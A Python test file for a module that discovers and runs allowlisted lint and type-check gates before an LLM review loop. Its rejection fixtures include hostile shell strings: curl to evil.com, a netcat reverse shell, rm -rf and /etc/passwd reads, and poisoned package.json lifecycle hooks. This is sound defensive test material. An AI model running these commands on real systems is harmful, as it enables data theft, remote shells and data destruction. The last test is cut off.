"""Tests for ``pdd.checkup_gates`` deterministic gate discovery + execution.

The gate module exists so ``pdd checkup --pr --review-loop`` cannot ship a
clean LLM verdict on top of a worktree that fails a fast, deterministic
local check (e.g. ``prettier --check``). The tests below pin every gate
the v1 discovery set is supposed to emit, and pin the runner-side
contract (timeout handling, output truncation, secret scrubbing,
artifact persistence).
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import patch


def _make_pkg_json(scripts: Dict[str, str]) -> str:
    return json.dumps({"name": "fake", "version": "0.0.0", "scripts": scripts})


def _git_init(worktree: Path) -> None:
    """Initialize a minimal git repo so ``git diff --check`` has something to scan."""
    subprocess.run(["git", "init", "-q"], cwd=worktree, check=True)
    subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
         "--allow-empty", "-m", "init", "-q"],
        cwd=worktree,
        check=True,
    )


class TestDiscoverGates:
    """``discover_gates`` inspects repo config and emits an allowlisted gate set."""

    def test_emits_git_diff_check_always(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "git-diff-check" in names

    def test_finds_prettier_check_from_package_json(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" in names
        gate = next(g for g in gates if g.name == "npm:format:check")
        assert gate.cmd[0] in {"npm", "yarn", "pnpm", "bun"}
        assert "format:check" in gate.cmd

    def test_skips_non_check_scripts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format": "prettier --write ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format" not in names

    def test_skips_install_or_deploy_scripts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "preinstall": "npm install foo",
                    "deploy": "firebase deploy",
                    "start": "node server.js",
                    "build": "tsc -p .",
                    "publish": "npm publish",
                    "push": "git push",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        for forbidden in (
            "npm:preinstall",
            "npm:deploy",
            "npm:start",
            "npm:build",
            "npm:publish",
            "npm:push",
        ):
            assert forbidden not in names

    def test_skips_eslint_without_no_fix_flag(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"lint:check": "eslint --fix ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:lint:check" not in names

    def test_emits_py_compile_for_changed_python_files(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "py-compile:a.py" in names
        gate = next(g for g in gates if g.name == "py-compile:a.py")
        # Iter-19 Finding 3: the gate MUST NOT write
        # ``__pycache__/*.pyc`` next to the source file. The argv
        # routes the syntax check through the builtin ``compile()``
        # so no bytecode is written to disk at all — neither
        # ``-B`` alone nor ``py_compile(..., cfile=os.devnull)`` are
        # sufficient (the former because py_compile writes
        # explicitly, the latter because py_compile uses an atomic
        # rename onto cfile which cannot target /dev/null).
        assert gate.cmd[:3] == [sys.executable, "-B", "-c"]
        assert "compile(" in gate.cmd[3]
        assert "py_compile" not in gate.cmd[3]
        assert gate.cmd[-1].endswith("a.py")

    def test_py_compile_required_fix_hint_does_not_recommend_bare_py_compile(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 3: the required_fix hint a fixer LLM
        receives MUST NOT tell it to run bare ``python -m py_compile``.
        The gate avoids that exact form because it writes
        ``__pycache__`` next to the source — if the fixer follows the
        hint as instructions, the loop's downstream commit/push
        helper can stage the generated bytecode into the PR.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        py_gate = next(g for g in gates if g.name == "py-compile:a.py")
        hint = py_gate.required_fix_hint or ""
        assert "python -m py_compile" not in hint, (
            f"hint must not recommend bare py_compile: {hint!r}"
        )
        # The safe form (``-B`` + builtin ``compile()``) MUST be
        # what's recommended so the fixer reproduces a non-mutating
        # check.
        assert "compile(" in hint or "-B" in hint, (
            f"hint must recommend the safe compile() form: {hint!r}"
        )

    def test_tsc_required_fix_hint_does_not_recommend_bare_npx(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 3: the tsc-noemit hint MUST point at
        ``npx --no-install``, not bare ``npx tsc``. A fixer following
        bare ``npx tsc`` can reach the npm registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # only when ``npx`` is on PATH
            return
        hint = tsc_gates[0].required_fix_hint or ""
        # ``npx --no-install tsc`` is fine; bare ``npx tsc`` is the
        # exact unsafe form we want to forbid. Search anchored on
        # whitespace so the safe form does not falsely trip the
        # check.
        assert "--no-install" in hint, f"hint must steer at --no-install: {hint!r}"
        # Explicit "do NOT use bare npx" guidance also recommended.
        assert "bare" in hint.lower() or "do not use" in hint.lower() or "no-install" in hint.lower()

    def test_py_compile_accepts_non_utf8_pep263_python_file(
        self, tmp_path: Path
    ) -> None:
        """Iter-20 Finding 2: valid Python files with a PEP 263 encoding
        declaration (``# -*- coding: latin-1 -*-`` etc.) must NOT trip
        the syntax gate. The pre-fix gate read the source with
        ``encoding='utf-8'`` and raised ``UnicodeDecodeError`` on the
        first non-UTF-8 byte, producing a false blocker. Passing bytes
        to ``compile()`` instead lets PEP 263 take effect.
        """
        from pdd.checkup_gates import discover_gates, run_gates

        _git_init(tmp_path)
        # A latin-1 source file: declare the encoding then include
        # bytes that are valid latin-1 but invalid UTF-8 (0xE9 = é).
        path = tmp_path / "latin.py"
        path.write_bytes(
            b"# -*- coding: latin-1 -*-\n"
            b"GREETING = 'caf\xe9'\n"
        )
        gates = [
            g for g in discover_gates(tmp_path, changed_files=("latin.py",))
            if g.name == "py-compile:latin.py"
        ]
        assert gates, "discovery should emit py-compile for latin.py"
        artifacts = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts,
            round_number=1,
            mode="review",
        )
        # ``compile()`` on the bytes payload respects PEP 263 and
        # exits 0 — the file is syntactically valid Python.
        assert results[0].exit_code == 0, (
            f"PEP 263 latin-1 source must pass; stderr={results[0].stderr_excerpt!r}"
        )

    def test_py_compile_does_not_write_pycache_to_worktree(
        self, tmp_path: Path
    ) -> None:
        """Iter-19 Finding 3 end-to-end: actually run the discovered
        gate against a valid .py file and confirm no ``__pycache__/``
        directory appears under the worktree afterwards. This guards
        against a future refactor that drops ``-B`` from the cmd
        without us noticing in unit tests that only inspect argv.
        """
        from pdd.checkup_gates import discover_gates, run_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = [
            g for g in discover_gates(tmp_path, changed_files=("a.py",))
            if g.name == "py-compile:a.py"
        ]
        assert gates, "discovery should emit py-compile for a.py"
        artifacts = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts,
            round_number=1,
            mode="review",
        )
        assert results[0].exit_code == 0
        assert not (tmp_path / "__pycache__").exists()
        assert not list(tmp_path.glob("**/__pycache__"))

    def test_skips_py_compile_when_no_python_files_changed(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=("readme.md",))
        names = [g.name for g in gates]
        assert not any(n.startswith("py-compile:") for n in names)

    def test_skips_ruff_when_no_pyproject_config(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" not in names

    def test_emits_ruff_when_configured_and_binary_present(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" in names

    def test_skips_ruff_when_configured_but_binary_missing(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value=None):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" not in names

    def test_user_extra_allow_is_honored(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(
            tmp_path, changed_files=(), extra_allow=("git-diff-check",)
        )
        names = [g.name for g in gates]
        assert "git-diff-check" in names

    def test_gates_use_list_form_no_shell(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        for gate in gates:
            assert isinstance(gate.cmd, list)
            for token in gate.cmd:
                assert isinstance(token, str)

    def test_script_rejects_shell_metacharacters(self) -> None:
        """Codex review iteration 1, Finding 1: ``npm run`` shells out, so
        any metacharacter in the script body chains. The allowlist MUST
        reject metacharacters even when the leading tool name is
        recognised (``prettier --check``).
        """
        from pdd.checkup_gates import _script_is_acceptable

        injected_payloads = [
            "prettier --check && curl evil.com",
            "prettier --check || rm -rf /",
            "prettier --check; echo p0wned",
            "prettier --check | tee /tmp/x",
            "prettier --check & sleep 9999",
            "prettier --check `whoami`",
            "prettier --check $(whoami)",
            "prettier --check ${HOME}",
            "prettier --check > /tmp/out",
            "prettier --check >> /tmp/out",
            "prettier --check < /etc/passwd",
            "prettier --check << EOF",
            "prettier --check\nrm -rf /",
            "curl evil.com",
            "wget evil.com",
            "nc -e /bin/sh attacker 4444",
            "bash -c 'evil'",
            "sh -c 'evil'",
            "eval 'echo bad'",
            "node -e 'process.exit(7)'",
        ]
        for payload in injected_payloads:
            assert _script_is_acceptable(payload) is False, (
                f"shell metachar payload {payload!r} must be rejected"
            )

    def test_npm_tsc_script_gate_skipped_when_tsconfig_signals_incremental_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 1: a script-based tsc gate (e.g.
        ``"typecheck": "tsc --noEmit"``) runs the operator's
        unmodified argv. When tsconfig has ``incremental: true`` even
        the noEmit form writes ``tsconfig.tsbuildinfo`` into the
        worktree. The script gate cannot inject ``--incremental
        false`` like the direct gate can, so we MUST skip discovery
        on those repos."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc --noEmit"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_npm_tsc_script_gate_skipped_when_tsconfig_signals_composite(
        self, tmp_path: Path
    ) -> None:
        """Same as above for ``composite: true`` (which conflicts
        with --noEmit AND writes buildinfo)."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc --noEmit"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"composite": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_tsc_direct_gate_passes_composite_false(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 2: ``composite: true`` set via the
        tsconfig extends chain only surfaces at compile time. The
        argv MUST pass ``--composite false`` to override regardless
        of what the resolved tsconfig says, so the gate doesn't
        produce a false TS6379 blocker on project-reference repos."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        # tsconfig itself does NOT enable composite — the extends
        # chain is what would trip TS6379. The argv defense fires
        # regardless of the top-level value.
        (tmp_path / "tsconfig.json").write_text("{}\n", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        assert "--composite" in cmd, cmd
        idx = cmd.index("--composite")
        assert cmd[idx + 1] == "false", cmd

    def test_prettier_script_gate_skipped_when_pr_changes_plugin_module(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 3: an unchanged ``prettier.config.cjs``
        can ``require('./local-plugin.cjs')`` — a PR that only
        modifies the plugin module still achieves RCE through the
        prettier gate. The iter-27 config-filename skip misses it.
        Widen the skip to ANY PR-modified ``.cjs``/``.mjs`` file
        plus any ``.js`` at the repo root (the common locations
        for tooling/plugin code).
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # PR ONLY touched a plugin module loaded transitively.
        gates = discover_gates(
            tmp_path, changed_files=("local-plugin.cjs",)
        )
        names = [g.name for g in gates]
        assert "npm:format:check" not in names
        # ``.mjs`` plugin module same.
        gates = discover_gates(
            tmp_path, changed_files=("plugins/foo.mjs",)
        )
        assert "npm:format:check" not in [g.name for g in gates]
        # ``.js`` at the repo root (common for ``prettier.config.js``
        # plugin imports) same.
        gates = discover_gates(
            tmp_path, changed_files=("plugin.js",)
        )
        assert "npm:format:check" not in [g.name for g in gates]

    def test_prettier_script_gate_still_fires_on_application_js_change(
        self, tmp_path: Path
    ) -> None:
        """Negative test for Finding 3: don't over-skip. Application
        ``.js`` files in subdirectories are far more common than
        plugin imports and skipping every JS-touching PR would
        gut the gate. Only repo-root ``.js`` and ``.cjs``/``.mjs``
        anywhere trip the skip."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(
            tmp_path,
            changed_files=("src/app.js", "src/components/foo.js"),
        )
        names = [g.name for g in gates]
        assert "npm:format:check" in names

    def test_tsc_noemit_substring_bypass_rejected(self) -> None:
        """Iter-27 Finding 2: ``tsc --noEmitOnError`` is a DIFFERENT
        TypeScript flag that does NOT suppress emit; the prior
        substring match (``"--noemit" not in stripped``) would have
        accepted it. ``tsc --noEmit false`` likewise emits.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "tsc --noEmitOnError",
            "tsc --noEmitOnError -p tsconfig.json",
            "tsc --noEmit false",
            "tsc --noEmit no",
            "tsc -p tsconfig.json --noEmitOnError",
            "tsc -p tsconfig.json --noEmit false",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"emitting payload must be rejected: {payload!r}"
            )
        # Sanity: the explicit ``--noEmit true`` and bare ``--noEmit``
        # are both accepted.
        assert _script_is_acceptable("tsc --noEmit") is True
        assert _script_is_acceptable("tsc --noEmit true") is True
        assert _script_is_acceptable("tsc --noEmit --incremental false") is True

    def test_tsc_direct_gate_passes_incremental_false_and_redirects_buildinfo(
        self, tmp_path: Path
    ) -> None:
        """Iter-27 Finding 1: even ``tsc --noEmit`` writes
        ``tsconfig.tsbuildinfo`` when ``incremental: true`` is set
        in tsconfig. The direct tsc-noemit gate MUST pass
        ``--incremental false`` and ``--tsBuildInfoFile /dev/null``
        so the gate cannot dirty the worktree.
        """
        import os
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        # The argv MUST contain both safeguards.
        assert "--incremental" in cmd and "false" in cmd, cmd
        assert "--tsBuildInfoFile" in cmd, cmd
        # ``--tsBuildInfoFile`` MUST point at devnull (or another
        # path that cannot be staged into the worktree).
        idx = cmd.index("--tsBuildInfoFile")
        assert cmd[idx + 1] == os.devnull, cmd

    def test_tsc_direct_gate_emits_with_composite_false_even_on_composite_config(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 2 replaces iter-27's top-level composite
        skip. The argv now passes ``--composite false`` to override
        whatever the tsconfig (or its extends chain) says, so the
        gate STILL emits — and the tsc invocation no longer hits
        TS6379. The top-level skip is removed because it only
        covered top-level composite, while extends-chain composite
        was still a false-blocker hazard."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"composite": true}}\n',
            encoding="utf-8",
        )
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        # The argv carries the composite override; top-level
        # composite must NOT cause discovery to skip.
        idx = cmd.index("--composite")
        assert cmd[idx + 1] == "false", cmd

    def test_npm_gate_skipped_when_pr_modified_prettier_config(
        self, tmp_path: Path
    ) -> None:
        """Iter-27 Finding 3: prettier loads ``prettier.config.{js,cjs,mjs}``
        (and ``.prettierrc.{js,cjs,mjs,ts}``) and executes it as
        JavaScript. A fork PR that ships a poisoned config can
        achieve RCE through the gate. Skip the gate when the PR
        modified any prettier config file.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # PR-modified prettier config in the changed-file inventory.
        gates = discover_gates(
            tmp_path, changed_files=("prettier.config.cjs",)
        )
        names = [g.name for g in gates]
        assert "npm:format:check" not in names
        # Sanity: when the PR did NOT touch the config the gate
        # still fires (this is the existing safe path).
        gates2 = discover_gates(tmp_path, changed_files=("src/a.ts",))
        assert "npm:format:check" in [g.name for g in gates2]

    def test_tsc_direct_gate_skipped_when_pr_modified_tsconfig(
        self, tmp_path: Path
    ) -> None:
        """Same as above but for the direct tsc-noemit path:
        ``tsconfig.json`` carries ``compilerOptions.paths`` /
        ``plugins`` / transformer references that tsc will load.
        Skip when the PR modified it."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}\n", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(
            tmp_path, changed_files=("tsconfig.json",)
        )
        assert "tsc-noemit" not in {g.name for g in gates}

    def test_script_rejects_tsc_p_without_noemit(self) -> None:
        """Iter-26 Finding 1: ``tsc -p <project>`` without ``--noEmit``
        writes .js / .d.ts / .tsbuildinfo files to the worktree. The
        head match alone is not enough — require ``--noEmit`` in the
        argv before accepting.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "tsc -p tsconfig.json",
            "tsc -p .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"tsc -p without --noEmit must be rejected: {payload!r}"
            )
        # The safe forms still pass.
        assert _script_is_acceptable("tsc --noEmit") is True
        assert _script_is_acceptable("tsc --noEmit -p tsconfig.json") is True
        assert _script_is_acceptable("tsc -p tsconfig.json --noEmit") is True

    def test_script_rejects_eslint_without_no_fix(self) -> None:
        """Iter-26 Finding 2: bare ``eslint .`` is rejected — ESLint
        config files can enable fix mode silently via
        ``"fix": true``. Require explicit ``--no-fix`` opt-out.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "eslint .",
            "eslint src/",
            "eslint --max-warnings 0 .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"eslint without --no-fix must be rejected: {payload!r}"
            )
        assert _script_is_acceptable("eslint --no-fix .") is True

    def test_script_rejects_cache_flag(self) -> None:
        """Iter-26 Finding 2: ``--cache`` writes a worktree-resident
        cache file (``.eslintcache`` / ``.prettiercache``). Gates
        must be non-mutating, so any ``--cache`` flag is rejected.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "eslint --no-fix --cache .",
            "prettier --check --cache .",
            "npx --no-install eslint --no-fix --cache .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"--cache payload must be rejected: {payload!r}"
            )

    def test_script_rejects_bare_npx_prefix(self) -> None:
        """Iter-22 Finding 2: ``npm run <script>`` lets the script body
        execute. A script body of ``npx tsc --noEmit`` or
        ``npx prettier --check .`` would let `npx` reach the npm
        registry and install/exec the tool when it is not in local
        ``node_modules`` — the same network-install hole the
        tsconfig-discovery path closes with ``--no-install``.
        ``_script_is_acceptable`` MUST reject bare ``npx`` prefixes.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "npx tsc --noEmit",
            "npx prettier --check .",
            "npx prettier --check src/**/*.ts",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"bare npx payload {payload!r} must be rejected"
            )

    def test_script_accepts_npx_with_no_install(self) -> None:
        """Iter-22 Finding 2 inverse: an explicit ``npx --no-install``
        invocation is the documented safe form (operators opt into
        the gate without the registry-install fallback)."""
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "npx --no-install tsc --noEmit",
            "npx --no-install prettier --check .",
        ):
            assert _script_is_acceptable(payload) is True, (
                f"safe npx payload {payload!r} must be accepted"
            )

    def test_discover_skips_npm_script_with_bare_npx_prefix(
        self, tmp_path: Path
    ) -> None:
        """End-to-end: a poisoned ``package.json`` that smuggles in
        bare ``npx tsc`` via a recognised script name must NOT emit a
        gate; the npm-run path would otherwise reach the registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"typecheck": "npx tsc --noEmit"}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_script_accepts_legitimate_prettier_with_glob(self) -> None:
        """Positive sanity: a real prettier invocation with a glob and
        space-separated args must STILL be accepted — the metachar guard
        cannot be so wide it breaks normal scripts."""
        from pdd.checkup_gates import _script_is_acceptable

        assert _script_is_acceptable("prettier --check src/**/*.ts") is True
        assert _script_is_acceptable("prettier --check '.'") is True
        assert _script_is_acceptable(
            "prettier --check src/foo.ts src/bar.ts"
        ) is True
        assert _script_is_acceptable("tsc --noEmit") is True

    def test_discover_skips_npm_script_with_shell_metachars(
        self, tmp_path: Path
    ) -> None:
        """End-to-end: a poisoned ``package.json`` must NOT emit a gate."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {"format:check": "prettier --check && curl http://evil.example/"}
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" not in names

    def test_discover_skips_npm_script_when_pre_lifecycle_hook_present(
        self, tmp_path: Path
    ) -> None:
        """Iter-15 Finding 2: a benign script must NOT be invoked when
        ``pre<name>``/``post<name>`` lifecycle hooks would also execute.
        npm/yarn/pnpm/bun fire those hooks around ``<runner> run <name>``,
        and discovery only validates the named script — so a malicious
        ``preformat:check`` would smuggle ``curl`` past the allowlist.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "format:check": "prettier --check .",
                    "preformat:check": "curl http://evil.example/exfil",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" not in names

    def test_discover_skips_npm_script_when_post_lifecycle_hook_present(
        self, tmp_path: Path
    ) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "typecheck": "tsc --noEmit",
                    "posttypecheck": "rm -rf .",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_git_diff_check_uses_pr_range_when_base_ref_resolvable(
        self, tmp_path: Path
    ) -> None:
        """Iter-15 Finding 1: a committed whitespace failure on the PR
        branch must be caught even when the worktree is clean. The gate
        must run ``git diff --check <base>...HEAD``, not the plain
        ``git diff --check`` against unstaged worktree changes.
        """
        from pdd.checkup_gates import discover_gates

        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        # Synthetic "PR" branch with a clean working tree.
        subprocess.run(["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "feat", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(tmp_path, changed_files=(), base_ref="main")
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert diff_gate.cmd == ["git", "diff", "--check", "main...HEAD"]

    def test_git_diff_check_falls_back_when_base_ref_unresolvable(
        self, tmp_path: Path
    ) -> None:
        """When no base ref verifies AND no ``main``/``master`` exists
        in the worktree (synthetic test repo on a feature branch with
        no remote), we keep the existing plain ``git diff --check`` so
        single-commit smoke tests still see a gate."""
        from pdd.checkup_gates import discover_gates

        subprocess.run(
            ["git", "init", "-q", "-b", "feature-only"], cwd=tmp_path, check=True
        )
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(
            tmp_path,
            changed_files=(),
            base_ref="branch-that-does-not-exist",
        )
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert diff_gate.cmd == ["git", "diff", "--check"]

    def test_git_diff_check_falls_back_to_main_master_when_no_base_ref(
        self, tmp_path: Path
    ) -> None:
        """When no ``base_ref`` is supplied but a local ``main``/``master``
        exists (the default for ``git init``), discovery still uses it
        so the PR-range guarantee holds even when the caller forgot to
        thread ``pr_metadata['base_ref']`` through. This preserves the
        product invariant from issue #1092: a committed whitespace
        failure must be caught."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
